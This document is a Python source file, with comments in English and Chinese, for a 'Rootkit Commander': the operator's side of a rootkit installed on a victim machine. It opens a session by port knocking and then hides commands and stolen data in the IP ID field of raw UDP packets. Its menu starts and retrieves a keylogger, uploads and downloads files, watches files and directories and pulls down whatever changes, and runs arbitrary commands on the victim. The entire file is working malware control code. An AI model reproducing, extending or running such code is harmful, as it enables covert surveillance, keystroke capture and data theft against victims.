import os
import platform
import socket
import struct
import time
import json
from datetime import datetime

# Commander configuration
VICTIM_IP = "192.168.1.124"  # Target victim IP address (change as appropriate)
KNOCK_SEQUENCE = [12345, 23456, 34567]  # Port knocking sequence (example)
COVERT_UDP_PORT = 40000  # The UDP port on a victim used for a covert channel

# Timeouts
RECV_TIMEOUT = 60.0  # seconds to wait for a response from a victim


def get_local_ip(dest_ip, dest_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 用 Victim 的 UDP 端口（这里用 COVERT_UDP_PORT）来探路
    s.connect((dest_ip, dest_port))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip


class Commander:
    def __init__(self):
        self.sock = None  # Raw socket for a covert channel
        self.connected = False

    def port_knock(self):
        """Perform port knocking to initiate session with a victim."""
        print(f"[*] Sending port knock sequence to victim {VICTIM_IP}")
        for port in KNOCK_SEQUENCE:
            try:
                # Use a normal TCP SYN attempt for knocking
                # We create a socket each time to send a SYN and immediately close
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect((VICTIM_IP, port))  # this will likely fail to connect
            except Exception:
                # We expect exceptions since no service is listening; this is fine
                pass
            finally:
                s.close()
            time.sleep(0.1)  # small delay between knocks
        # After knocking, initialize a covert channel socket
        self.start_covert_channel()
        # Optionally, we could wait for a specific "ack" from a victim.
        # For simplicity, we'll assume a connection established if a victim responds to the first command.
        print("[*] Knock sequence sent. Attempting to establish covert channel...")

    def start_covert_channel(self):
        """Initialize the raw socket for covert communication."""
        try:
            if platform.system() == "Darwin":
                proto = socket.IPPROTO_RAW
            else:
                proto = socket.IPPROTO_UDP
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, proto)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            self.sock.settimeout(RECV_TIMEOUT)
        except PermissionError:
            print("[!] Permission denied: Raw sockets require root privileges.")
            exit(1)
        except Exception as e:
            print(f"[!] Failed to create raw socket: {e}")
            exit(1)

    def send_covert_message(self, data_bytes):
        """Send a message (bytes) to a victim via a covert channel (IP ID field encoding)."""
        if not self.sock:
            raise RuntimeError("Raw socket is not initialized")
        # Prepend 2-byte length (big-endian)
        length = len(data_bytes)
        header = struct.pack(">H", length)
        message = header + data_bytes
        # Pad a message to even length for 2-byte chunks
        if len(message) % 2 != 0:
            message += b'\x00'
        # Send each 2-byte chunk in the IP I D field
        for i in range(0, len(message), 2):
            chunk = message[i:i + 2]
            # Convert chunk to 16-bit integer
            if len(chunk) < 2:
                # should not happen due to padding
                chunk += b'\x00'
            value = struct.unpack(">H", chunk)[0]
            # Build IP header (20 bytes) + UDP header (8 bytes)
            # IP header fields
            ver_ihl = 0x45  # Version=4, IHL=5
            tos = 0
            total_len = 20 + 8  # no payload
            identification = value  # covert data
            flags_frag = 0  # no fragmentation
            ttl = 64
            proto = socket.IPPROTO_UDP
            # src_ip = socket.gethostbyname(socket.gethostname())  # attacker local IP
            src_ip = get_local_ip(VICTIM_IP, COVERT_UDP_PORT)

            dst_ip = VICTIM_IP
            src_addr = socket.inet_aton(src_ip)
            dst_addr = socket.inet_aton(dst_ip)
            # IP header pack (without checksum for now)
            ip_header = struct.pack(">BBHHHBBH4s4s",
                                    ver_ihl, tos, total_len, identification,
                                    flags_frag, ttl, proto, 0, src_addr, dst_addr)
            # Calculate IP header checksum
            chksum = self.calc_checksum(ip_header)
            # Re-pack with checksum
            ip_header = struct.pack(">BBHHHBBH4s4s",
                                    ver_ihl, tos, total_len, identification,
                                    flags_frag, ttl, proto, chksum, src_addr, dst_addr)
            # UDP header (8 bytes)
            src_port = 55555  # arbitrary source port
            dst_port = COVERT_UDP_PORT
            udp_len = 8
            udp_checksum = 0  # no checksum (0 means not used for UDP)
            udp_header = struct.pack(">HHHH", src_port, dst_port, udp_len, udp_checksum)
            # Final packet
            packet = ip_header + udp_header
            # Send the raw packet
            if platform.system() == "Darwin":
                self.sock.sendto(packet, (dst_ip, 1))
            else:
                self.sock.sendto(packet, (dst_ip, 0))  # 0 for port is ignored because IP_HDRINCL
        # Small delay to ensure packets are sent out before possibly sending next
        time.sleep(0.05)

    def recv_covert_message(self):
        """Receive a covert message from a victim. Reassembles from IP ID field."""
        if not self.sock:
            raise RuntimeError("Raw socket not initialized")
        # We will loop reading packets until we have a full message
        length = None
        data = b''
        start_time = time.time()
        while True:
            try:
                packet, addr = self.sock.recvfrom(65535)
            except socket.timeout:
                if length is None:
                    return None
                if time.time() - start_time > RECV_TIMEOUT:
                    return None
                continue
            # We only want packets from victim and protocol UDP
            if addr[0] != VICTIM_IP:
                continue
            # Parse IP header (first 20 bytes)
            ip_header = packet[:20]
            # unpack identification and protocol from IP header
            ip_fields = struct.unpack(">BBHHHBBH4s4s", ip_header)
            identification = ip_fields[3]
            proto = ip_fields[6]
            if proto != socket.IPPROTO_UDP:
                continue  # not our covert UDP packet
            # The UDP header follows (8 bytes), then (no payload).
            # We don't actually need anything from UDP header here.
            # Extract the covert data from identification
            chunk_value = identification
            chunk_bytes = struct.pack(">H", chunk_value)
            # If this is the first chunk, the first two bytes represent length
            if length is None:
                # Set expected length from first two bytes
                length = struct.unpack(">H", chunk_bytes)[0]
                data = b''  # start collecting after getting length
                print(f"[Download]: {length} bytes")
            else:
                data += chunk_bytes
                print(f"[Download] Received {len(data)}/{length} bytes", end='\r')
            # If length is set and we've collected enough bytes, break
            if length is not None and len(data) >= length:
                # We might have collected extra padded byte; trim to length
                data = data[:length]
                break
            # Safety: prevent infinite loop in case of issues
            if time.time() - start_time > RECV_TIMEOUT:
                break
        if length is None:
            return None
        return data

    def calc_checksum(self, msg):
        """Compute IP header checksum"""
        s = 0
        # Sum all 16-bit words
        for i in range(0, len(msg), 2):
            w = msg[i] << 8
            if i + 1 < len(msg):
                w += msg[i + 1]
            s += w
        # Add carry bits
        s = (s & 0xFFFF) + (s >> 16)
        s = ~s & 0xFFFF
        return s

    def disconnect(self):
        """Disconnect the session."""
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.sock = None
        self.connected = False
        print("[*] Disconnected from victim.")

    def download_file_with_debug(self, remote_path: str, local_path: str, timeout=60):
        """
        下载 remote_path 文件并打印每个 chunk 的调试信息
        """
        # 1) 发送 CMD_GET
        cmd = f"CMD_GET:{remote_path}".encode()
        print(f"[*] 请求下载文件 `{remote_path}` …")
        self.send_covert_message(cmd)

        expected_length = None  # 总长度
        data = b''
        chunk_count = 0
        start_time = time.time()

        while True:
            try:
                packet, addr = self.sock.recvfrom(65535)
            except socket.timeout:
                # 超时还没拿到任何 chunk，就退出
                if expected_length is None:
                    print("[DEBUG] 没有拿到任何数据包，下载失败或命令未到达")
                    return False
                # 已经开始接收过，就继续等，直到全超时
                if time.time() - start_time > timeout:
                    print(f"\n[DEBUG] 总超时 ({timeout}s)，共收到了 {chunk_count} 个 chunk，{len(data)} bytes")
                    return False
                print(f"[DEBUG] 等待更多 chunk… 已收到 {chunk_count} 个，{len(data)} bytes", end='\r')
                continue

            # 只处理来自 victim 的 UDP 包
            if addr[0] != VICTIM_IP:
                continue

            # 解析 IP header 中的 identification 字段
            ip_header = packet[:20]
            ip_fields = struct.unpack(">BBHHHBBH4s4s", ip_header)
            proto = ip_fields[6]
            if proto != socket.IPPROTO_UDP:
                continue
            ip_id = ip_fields[3]
            chunk = struct.pack(">H", ip_id)
            chunk_count += 1

            # 第一个 chunk：两字节总长度
            if expected_length is None:
                expected_length = struct.unpack(">H", chunk)[0]
                print(f"[Download Debug] 文件总长度标识: {expected_length} bytes，开始接收数据 chunk…")
            else:
                data += chunk
                received = len(data)
                print(f"[Download Debug] chunk #{chunk_count}: id={ip_id}, 收到 {received}/{expected_length} bytes", end='\r')

            # 如果收满就退出
            if expected_length is not None and len(data) >= expected_length:
                print()  # 换行
                break

        # 写盘
        try:
            with open(local_path, "wb") as f:
                f.write(data[:expected_length])
            print(f"[*] 文件已保存到 `{local_path}` ({expected_length} bytes)")
            return True
        except Exception as e:
            print(f"[!] 写入本地文件失败：{e}")
            return False

# High-level command functions using the Commander class
def cmd_uninstall(comm: Commander):
    print("[*] Instructing victim to uninstall rootkit...")
    comm.send_covert_message(b"CMD_UNINSTALL")
    resp = comm.recv_covert_message()
    if resp:
        print("[Victim]:", resp.decode(errors='ignore'))
    comm.disconnect()


def cmd_start_keylogger(comm: Commander):
    print("[*] Instructing victim to start keylogger...")
    comm.send_covert_message(b"CMD_KEYLOG_START")
    resp = comm.recv_covert_message()
    if resp:
        print("[Victim]:", resp.decode())


def cmd_stop_keylogger(comm: Commander):
    print("[*] Instructing victim to stop keylogger...")
    comm.send_covert_message(b"CMD_KEYLOG_STOP")
    resp = comm.recv_covert_message()
    if resp:
        print("[Victim]:", resp.decode())


def cmd_get_keylog(comm: Commander):
    print("[*] Requesting keylog data from victim...")
    comm.send_covert_message(b"CMD_GET_KEYLOG")
    resp = comm.recv_covert_message()
    if resp is not None:
        # Save the keylog data to a local file
        data = resp.decode(errors='ignore')
        print("[*] Keylog data received. Saving to keylog.txt")
        with open("keylog.txt", "w") as kf:
            kf.write(data)
        print("[*] Keylog saved. Contents:\n" + data)
    else:
        print("[!] No response or empty keylog.")


def cmd_put_file(comm: Commander):
    local_path = input("Enter local file path to send: ").strip()
    remote_path = input("Enter destination path on victim: ").strip()
    if not os.path.isfile(local_path):
        print("[!] File not found:", local_path)
        return
    # Read file content
    try:
        with open(local_path, "rb") as f:
            content = f.read()
    except Exception as e:
        print("[!] Failed to read file:", e)
        return
    # Construct command: "CMD_PUT:<remote_path>:<size>"
    header = f"CMD_PUT:{remote_path}:{len(content)}".encode()
    print(f"[*] Sending file '{local_path}' to victim at '{remote_path}' ({len(content)} bytes)...")
    comm.send_covert_message(header + content)
    resp = comm.recv_covert_message()
    if resp:
        print("[Victim]:", resp.decode())
    else:
        print("[!] No response, file transfer may have failed.")


def cmd_get_file(comm: Commander):
    remote = input("Enter file path on victim to download: ").strip()
    local  = input("Enter local save path: ").strip() or os.path.basename(remote)
    comm.download_file_with_debug(remote, local)


def cmd_monitor_file(comm: Commander):
    file_path = input("Enter file path on victim to monitor: ").strip()
    date_str = datetime.now().strftime("%Y-%m-%d")
    log_filename = f"{date_str}.log"
    print(f"[DEBUG][Commander] Sending CMD_MON_FILE:{file_path}")
    comm.send_covert_message(f"CMD_MON_FILE:{file_path}".encode())

    with open(log_filename, "a", encoding="utf-8") as logfile:
        try:
            while True:
                data = comm.recv_covert_message()
                print(f"[DEBUG][Commander] recv_covert_message raw: {data!r}")
                if data is None:
                    continue

                # —— 1. 二进制文件推送（文件内容直接发送的情况） ——
                if data.startswith(b"FILE_TRANSFER:"):
                    parts = data.split(b":", 2)
                    if len(parts) == 3:
                        filename = parts[1].decode()
                        file_bytes = parts[2]
                        print(f"[DEBUG][Commander] Received FILE_TRANSFER for {filename}, {len(file_bytes)} bytes")
                        # 保存文件到当前目录
                        with open(filename, "wb") as out:
                            out.write(file_bytes)
                        print(f"[*] 已接收并保存文件：{filename}")
                    else:
                        print("[!] 文件传输消息格式错误")
                    continue

                # —— 2. JSON 日志推送（文件变动通知） ——
                try:
                    line = data.decode('utf-8', errors='ignore').strip()
                    print(f"[DEBUG][Commander] JSON line: {line}")
                    msg = json.loads(line)
                    print(f"[DEBUG][Commander] Parsed JSON msg: {msg}")
                except Exception as e:
                    print(f"[DEBUG][Commander] JSON parse error: {e}")
                    continue

                ts = msg.get('timestamp', '')
                typ = msg.get('type', '')
                path = msg.get('path', '')
                content = msg.get('content', '')

                # 打印关键信息
                print(f"[{ts}] {typ} | {path}")
                if content:
                    print(content)
                # **新功能**：输出变动文件路径并下载文件
                if path:
                    print(f"[*] 变动文件路径：{path}")
                    try:
                        local_name = os.path.basename(path)
                        success = comm.download_file_with_debug(path, local_name)
                        if not success:
                            print(f"[!] 下载文件失败：{path}")
                    except Exception as e:
                        print(f"[!] 下载文件 {path} 时发生异常：{e}")
                print("-" * 40)
                # 将原始日志内容追加写入日志文件
                logfile.write(line + "\n")
                logfile.flush()

        except KeyboardInterrupt:
            print("\n[*] 停止文件监控。")
            comm.send_covert_message(b"CMD_STOP_MON_FILE")



def cmd_monitor_dir(comm: Commander):
    dir_path = input("Enter directory path on victim to monitor: ").strip()
    date_str = datetime.now().strftime("%Y-%m-%d")
    log_filename = f"{date_str}.log"
    print(f"[*] 开始监控目录：{dir_path}。日志保存为 {log_filename}，按 Ctrl+C 停止。")
    comm.send_covert_message(f"CMD_MON_DIR:{dir_path}".encode())

    with open(log_filename, "a", encoding="utf-8") as logfile:
        try:
            while True:
                data = comm.recv_covert_message()
                if not data:
                    continue  # 超时重试
                try:
                    msg = json.loads(data.decode(errors="ignore"))
                except json.JSONDecodeError:
                    # 解析失败就忽略
                    continue

                # 打印关键信息
                print(f"[{msg['timestamp']}] 事件类型: {msg['type']} | 文件: {msg.get('filename', '')} | 路径: {msg['path']}")
                if 'content' in msg:
                    print(msg['content'])
                # **新功能**：输出变动文件路径并下载文件
                if 'path' in msg:
                    changed_path = msg['path']
                    print(f"[*] 变动文件路径：{changed_path}")
                    try:
                        local_name = os.path.basename(changed_path)
                        success = comm.download_file_with_debug(changed_path, local_name)
                        if not success:
                            print(f"[!] 下载文件失败：{changed_path}")
                    except Exception as e:
                        print(f"[!] 下载文件 {changed_path} 时发生异常：{e}")
                print("-" * 40)

                # 追加写入日志文件
                logfile.write(json.dumps(msg, ensure_ascii=False) + "\n")
                logfile.flush()

        except KeyboardInterrupt:
            print("\n[*] 停止目录监控。")
            comm.send_covert_message(b"CMD_STOP_MON_DIR")


def cmd_run_program(comm: Commander):
    prog = input("Enter command to run on victim: ").strip()
    if prog == "":
        return
    cmd = f"CMD_RUN:{prog}".encode()
    print(f"[*] Sending execution request for '{prog}'")
    comm.send_covert_message(cmd)
    resp = comm.recv_covert_message()
    if resp is None:
        print("[!] No response from victim for execution request.")
    else:
        output = resp.decode(errors='ignore')
        print("-----[ Program Output ]-----")
        print(output)
        print("----------[ End ]----------")


def cmd_fetch_events(comm: Commander):
    print("Get Minitor events from victim...")
    comm.send_covert_message(b"CMD_FETCH_EVENTS")
    resp = comm.recv_covert_message()
    if resp:
        print("=== Monitor Events ===")
        print(resp.decode(errors='ignore'))
    else:
        print("No events found or timeout")


comm = None


def main():
    global VICTIM_IP
    VICTIM_IP = input("Enter victim IP address: ").strip()

    comm = Commander()
    while True:
        if not comm.connected:
            # Not connected menu
            print("\n=== Rootkit Commander (Disconnected) ===")
            print("1. Connect to victim (port knocking)")
            print("0. Exit")
            choice = input("Select an option: ").strip()
            if choice == '1':
                # initiate connection
                comm.port_knock()
                # Optionally, check connectivity by pinging victim via covert channel
                # We could send a harmless command or a ping message.
                # Here, we send a simple ping and expect "PONG".
                comm.send_covert_message(b"CMD_PING")
                resp = comm.recv_covert_message()
                if resp and resp.startswith(b"PONG"):
                    comm.connected = True
                    print("[*] Covert channel established with victim.")
                else:
                    print("[!] No response from victim. Connection failed.")
                    comm.disconnect()
            elif choice == '0':
                break
            else:
                continue
        else:
            # Connected menu
            print("\n=== Rootkit Commander (Connected) ===")
            print("2. Disconnect from victim")
            print("3. Uninstall rootkit on victim")
            print("4. Start keylogger")
            print("5. Stop keylogger")
            print("6. Get keylog file")
            print("7. Upload file to victim")
            print("8. Download file from victim")
            print("9. Monitor a file")
            print("10. Monitor a directory")
            print("11. Run a program on victim")
            print("12. Fetch monitor events")
            print("0. Exit")
            choice = input("Select an option: ").strip()
            if choice == '2':
                comm.send_covert_message(b"CMD_DISCONNECT")
                comm.disconnect()
            elif choice == '3':
                cmd_uninstall(comm)
            elif choice == '4':
                cmd_start_keylogger(comm)
            elif choice == '5':
                cmd_stop_keylogger(comm)
            elif choice == '6':
                cmd_get_keylog(comm)
            elif choice == '7':
                cmd_put_file(comm)
            elif choice == '8':
                cmd_get_file(comm)
            elif choice == '9':
                cmd_monitor_file(comm)
            elif choice == '10':
                cmd_monitor_dir(comm)
            elif choice == '11':
                cmd_run_program(comm)
            elif choice == '12':
                cmd_fetch_events(comm)
            elif choice == '0':
                # Exit the commander (also disconnect if connected)
                if comm.connected:
                    comm.send_covert_message(b"CMD_DISCONNECT")
                    comm.disconnect()
                break
            else:
                continue


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Commander terminated by user.")
        if 'comm' in locals() and comm is not None:
            comm.disconnect()
